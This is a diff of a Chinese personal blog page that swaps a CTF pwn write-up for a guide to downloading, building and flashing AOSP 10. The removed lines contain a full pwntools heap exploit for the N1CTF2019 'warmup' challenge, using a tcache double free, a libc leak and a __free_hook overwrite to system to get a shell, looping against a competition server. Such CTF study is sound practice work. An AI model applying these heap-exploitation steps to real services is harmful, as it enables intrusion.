@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>N1CTF2019 | 风云阁</title>
-  <meta name="keywords" content=" Pwn , CTF ">
-  <meta name="description" content="N1CTF2019 | 风云阁">
+  <title>AOSP刷机 | 风云阁</title>
+  <meta name="keywords" content=" AOSP , Mobile ">
+  <meta name="description" content="AOSP刷机 | 风云阁">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="MyGemspwntools gdb 调试脚本 attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;{},init_cmd&#x3D;[])  brk_pts （断点）和 syms （符号）的地址是低12位，可以在IDA中查看。 init_cmd ：gdb脚本，多行组成的列表。 from pwn import *  def attach_dbg_pie(io,brk_pts&#x3D;[],syms&#x3D;">
 <meta property="og:type" content="article">
@@ -408,9 +408,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-N1CTF2019" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-AOSP刷机" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">N1CTF2019</h1>
+        <h1 class="article-title">AOSP刷机</h1>
     
     <div class="article-meta">
         
@@ -418,23 +418,23 @@
         
         <span class="book">
             
-                <a  data-rel="CTF">CTF</a>
+                <a  data-rel="Mobile">Mobile</a>
             
         </span>
         
         
         <span class="tag">
             
-            <a class="color4">Pwn</a>
+            <a class="color5">AOSP</a>
             
-            <a class="color4">CTF</a>
+            <a class="color2">Mobile</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-04-11 01:26:39'>2019-11-30 00:00</time>
+        创建时间:<time class="date" title='更新时间: 2020-07-04 18:28:34'>2020-06-20 00:00</time>
         
     </div>
     <div class="article-meta">
@@ -456,7 +456,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N1CTF2019"><span class="toc-text">N1CTF2019</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#warmup"><span class="toc-text">warmup</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AOSP-10刷机"><span class="toc-text">AOSP 10刷机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#下载"><span class="toc-text">下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#刷机-flash-images"><span class="toc-text">刷机 (flash images)</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -472,130 +472,31 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="N1CTF2019"><a href="#N1CTF2019" class="headerlink" title="N1CTF2019"></a>N1CTF2019</h1><h3 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h3><pre><code>#!/usr/bin/env python
-#coding=utf8
-from pwn import *
-p=process(&#39;./warmup&#39;)
-#p=remote(&#39;47.52.90.3&#39;,9999)
-ctx = context
-ctx.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+        <p><div class='inner-toc'><h2>目录</h2><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AOSP-10刷机"><span class="toc-text">AOSP 10刷机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#下载"><span class="toc-text">下载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编译"><span class="toc-text">编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#刷机-flash-images"><span class="toc-text">刷机 (flash images)</span></a></li></ol></li></ol></div></p>
+<h1 id="AOSP-10刷机"><a href="#AOSP-10刷机" class="headerlink" title="AOSP 10刷机"></a>AOSP 10刷机</h1><p>终于把项目完成了，抽空有时间把这篇博客补齐。以后学习重心从Linux转移到安卓的移动安全了。 </p>
+<p>macos 编译成功 AOSP 10 的过程，遇到几个编译异常，谷歌搜索好长一段时间才把问题解决。 </p>
+<p>我编译过两个版本，一个是最新的android-10，适配Pixel 3XL，另一个版本是 android-5.0，适配 Nexus 5。</p>
+<p>整个过程主要参考的<a href="https://source.android.com/" target="_blank" rel="noopener">官方文档</a>，由于代码仓库下载速度慢，改用国内镜像。这里推荐<a href="https://lug.ustc.edu.cn/wiki/mirrors/help/aosp" target="_blank" rel="noopener">中科大源</a>，下载没出任何意外。3个小时完成。</p>
+<p>工作机硬件配置是6核i7、16G内存，android-10 编译时长2.5个小时。android-5 的编译耗时40分钟。 </p>
+<p>写这篇博客记录AOSP下载、编译、刷机的完整过程，备忘。 主要内容记录的版本是 android-10，对 5 的过程稍加补充说明。</p>
+<h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>找到手机支持的版本号 build。 这里我选择的是 – </p>
+<p><img src="/2020/06/20/AOSP%E5%88%B7%E6%9C%BA/image-20200704175023906.png" alt="image-20200704175023906"></p>
+<p>安装 repo 工具。</p>
+<p>home 目录创建 bin目录，其他地方也可以。 </p>
+<pre><code>mkdir ~/bin
+PATH=~/bin:$PATH</code></pre><p>下载，改权限。 </p>
+<pre><code>curl https://storage.googleapis.com/git-repo-downloads/repo &gt; ~/bin/repo
+chmod a+x ~/bin/repo</code></pre><p>初始化repo，选择指定版本号build，这里使用中科大源，<strong>下载速度快很多</strong>。</p>
+<pre><code>repo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b $ANDROID_VERSION_CODE</code></pre><p>开始下载。 预计耗时3小时。 </p>
+<pre><code>repo sync</code></pre><h2 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h2><p>使用 <code>envsetup.sh</code> 脚本初始化环境，此过程将导入若干命令。 </p>
+<pre><code>source build/envsetup.sh </code></pre><p>执行 <code>lunch</code> 命令，选择设备代号。</p>
+<pre><code>lunch</code></pre><p>执行 <code>make</code> 进行编译。 N参数表示线程数。 工作机6核12线程，N=12。</p>
+<pre><code>m -j12</code></pre><p>macOS 10.15 版本编译时候遇到 sepolicy 错误，需要改编译配置文件。 </p>
+<p>经过一番谷歌查找，找到此处。 修改一下继续编译。 </p>
+<h2 id="刷机-flash-images"><a href="#刷机-flash-images" class="headerlink" title="刷机 (flash images)"></a>刷机 (flash images)</h2><p>Google 的手机同时按音量下键和电源键，长按至进入<code>bootloader</code> 模式。</p>
+<pre><code>export 
+fastboot </code></pre><p>等待，开机后，一款很土的UI出现了，是的，这就是AOSP裸系统，哈哈哈。</p>
 
-#----- debug info -----#
-# ctx.log_level = &#39;debug&#39;
-#gdb.attach(p)
-#add 0xb98
-#edit 0x00D68
-#----- debug info -----#
-
-#----- quick script -----#
-sd =lambda c:p.send(c)
-sdl =lambda c:p.sendline(c)
-sda = lambda a,c: p.sendafter(a,c)
-sdla = lambda a,c: p.sendlineafter(a,c)
-rl =lambda c:p.recvline()
-ru =lambda c:p.recvuntil(c,True)
-rle =lambda c:p.recvline_endswith(c,keepends=False)
-rls =lambda c:p.recvline_startswith(c,False)
-rn = lambda c:p.recvn(c)
-uu64 = lambda c:  u64(c.ljust(8,&#39;\x00&#39;))
-itr =lambda :p.interactive()
-#----- quick script -----#
-
-#----- global variables -----#
-note_list=0x0202080
-
-#----- global variables -----#
-
-def cmd(idx):
-    sda(&#39;&gt;&gt;&#39;,str(idx))
-
-def add(c):
-    cmd(1)
-    sda(&#39;content&gt;&gt;&#39;,c)
-
-def free(idx):
-    cmd(2)
-    sda(&#39;index:&#39;,str(idx))
-
-def edit(idx,c):
-    cmd(3)
-    sda(&#39;index:&#39;,str(idx))
-    sda(&#39;content&gt;&gt;&#39;,c)
-
-def attack():
-    print(&#39;Sleeping&#39;)
-    #sleep(4)
-    print(&#39;Waked up!&#39;)
-
-    add(&#39;0&#39;) #670;
-    add(&#39;1&#39;)
-    add(&#39;2&#39;)
-
-    free(0)
-    free(0)
-    free(0)
-    free(0)
-
-    add(p8(0x60)) #0 #670
-    add(&#39;3&#39;) #670 #3
-    add(p64(0)+p64(0x51)) #660 #4
-
-    free(0)
-    edit(2,&#39;debug&#39;)
-
-    edit(4,p64(0)+p64(0xa1))
-
-    for i in range(7):
-        free(3)
-    free(3)
-
-    edit(4,p64(0)+p64(0x51)+p16(0x7760))
-    add(&#39;0&#39;)
-    add(&#39;3&#39;)
-
-    free(0)
-    #free(0)
-    gdb_ok=False
-    # edit(2,&#39;debug&#39;)
-    edit(3,p64(0xfbad3c80)+p64(0)*3+p8(0))
-
-    libc_base=uu64(rn(14)[8:14])-0x3ed8b0
-    print(hex(libc_base))
-    free_hook=0x3ed8e8+libc_base
-    sys=libc_base+0x4f440
-    if (libc_base&amp;0xfff)==0:
-        gdb_ok=True
-        print(&#39;--&#39;*10+&quot;GOOD&quot;+&#39;--&#39;*10)
-        #gdb.attach(p)
-    else:
-        return
-
-    edit(4,p64(0)+p64(0x51)+p64(free_hook))
-    add(&#39;0&#39;)
-    add(p64(sys)) #5
-    print(&#39;--&#39;*10+&quot;GOOD&quot;+&#39;--&#39;*10)
-    #if gdb_ok:
-    #    gdb.attach(p)
-    add(&#39;/bin/sh&#39;) #6
-    free(6)
-
-    itr()
-    pass
-
-
-if __name__==&quot;__main__&quot;:
-    #attack()
-    while True:
-        try:
-            attack()
-            p.close()
-            p=remote(&#39;47.52.90.3&#39;,9999)
-            #gdb.attach(p)
-        except EOFError:
-            p=remote(&#39;47.52.90.3&#39;,9999)
-            #gdb.attach(p)
-
-</code></pre>
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
     </div>
@@ -604,12 +505,12 @@ if __name__==&quot;__main__&quot;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>N1CTF2019</p>
+    <p><span class="copy-title">文章标题:</span>AOSP刷机</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-11-30, 00:00:00</p>
-    <p><span class="copy-title">最后更新:</span>2020-04-11, 01:26:39</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/30/N1CTF2019/" title="N1CTF2019">https://primelyw.github.io/2019/11/30/N1CTF2019/</a>
+    <p><span class="copy-title">发布时间:</span>2020-06-20, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-07-04, 18:28:34</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/06/20/AOSP%E5%88%B7%E6%9C%BA/" title="AOSP刷机">https://primelyw.github.io/2020/06/20/AOSP%E5%88%B7%E6%9C%BA/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
